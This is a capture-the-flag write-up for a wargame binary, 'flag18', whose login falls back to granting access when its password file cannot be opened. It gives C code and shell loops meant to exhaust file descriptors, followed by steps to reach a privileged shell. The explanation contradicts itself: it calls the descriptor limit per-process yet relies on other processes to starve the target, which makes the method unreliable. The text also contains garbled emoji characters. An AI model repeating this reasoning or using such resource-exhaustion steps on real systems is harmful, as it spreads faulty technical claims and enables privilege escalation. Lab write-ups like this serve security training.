
---
### ğŸ“˜ Overview

> The binary `flag18` manages shell access via a global flag. Normally, authentication through a password file is required to flip this flag.  
> However, if the file canâ€™t be opened, the program grants access **anyway**.
> 
> Our mission? Exploit this flawed logic by **starving the process of file descriptors**.

**User:** `level18`  
**Target Binary:** `/home/flag18/flag18`  
**Privilege Escalation Goal:** Gain access to shell as `flag18` by triggering the fallback login path.

---

### ğŸ” Vulnerability Mechanics

Inside the source code, the login logic operates as follows:

```c
fp = fopen(PWFILE, "r");
if (fp) {
   // Validate password...
} else {
   globals.loggedin = 1;  // Bypass triggered if file can't be opened
}
```

ğŸš¨ The problem is clear:

- If the **password file canâ€™t be opened**, the user is **still logged in**.
    
- The assumption is that the file **always opens** â€” which weâ€™ll break.
    

---

### ğŸ§¨ Exploit Concept

The Linux kernel enforces a **limit on open file descriptors per process**. If we **saturate the system with open files**, the vulnerable program wonâ€™t be able to `fopen()` the password file â€” triggering the insecure fallback behavior.

---

### ğŸ§ª Step-by-Step Attack Plan

---

#### ğŸ”§ Step 1: Saturate File Descriptors

Weâ€™ll build a small C program to open hundreds (or thousands) of files:

```c
// filed.c
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

int main() {
    for (int i = 0; i < 4096; i++) {
        open("/dev/null", O_RDONLY);
    }
    pause();  // keep process alive
    return 0;
}
```

Compile and deploy many instances:

```bash
gcc filed.c -o filed
for i in $(seq 1 1000); do ./filed & done
```

ğŸ“Œ This opens thousands of file descriptors across processes.

---

#### ğŸ§ª Step 2: Launch the Vulnerable Binary

Open a second terminal and run:

```bash
./flag18 -d /dev/tty -v
```

ğŸ”¸ This enables debug mode with verbose output.

At the prompt, type:

```bash
login
```

âœ… If file descriptors are properly exhausted, the program **canâ€™t read the password file** â€” and logs you in **without any password**.

---

#### âš ï¸ Step 3: Prevent Shell Argument Breakage

The program later calls `/bin/sh` via:

```c
execve("/bin/sh", argv, envp);
```

But `argv` includes `-d /dev/tty -v`, which are **invalid shell arguments** and cause a crash.

Fix this by prepending a benign dummy flag:

```bash
./flag18 --safe -d /dev/tty -v
```

This tricks the shell into ignoring the dangerous flags.

---

#### ğŸšª Step 4: Free Up the Descriptors

Once youâ€™re logged in:

```bash
killall filed
```

This clears the exhaustion state so the shell can spawn successfully.

Then run:

```bash
shell
```

ğŸ¥ You now have a shell as `flag18`.

---

#### ğŸ Step 5: Claim the Prize

```bash
getflag
```

âœ… Output:

```
You have successfully executed getflag on a target account
```

---

### ğŸ§© Exploit Flow Summary

```
1. Saturate the system with open FDs via mass processes
2. Launch ./flag18 using a harmless dummy flag
3. Trigger fallback login by exhausting file descriptors
4. Kill mass file opener processes
5. Launch 'shell' cleanly
6. Extract the flag with 'getflag'
```

---

### ğŸ“š Lessons Learned

- **Exploiting assumptions** in code paths (e.g., â€œfile will always openâ€) is a powerful tactic.
    
- Understanding Linux internals like **file descriptor limits** can open unexpected attack vectors.
    
- **Resource exhaustion** is not just a DoS â€” it can lead to **logic bypasses** and privilege escalation.
    
- Sometimes, **fixing argument vectors** can be as critical as the exploit itself.
    

---
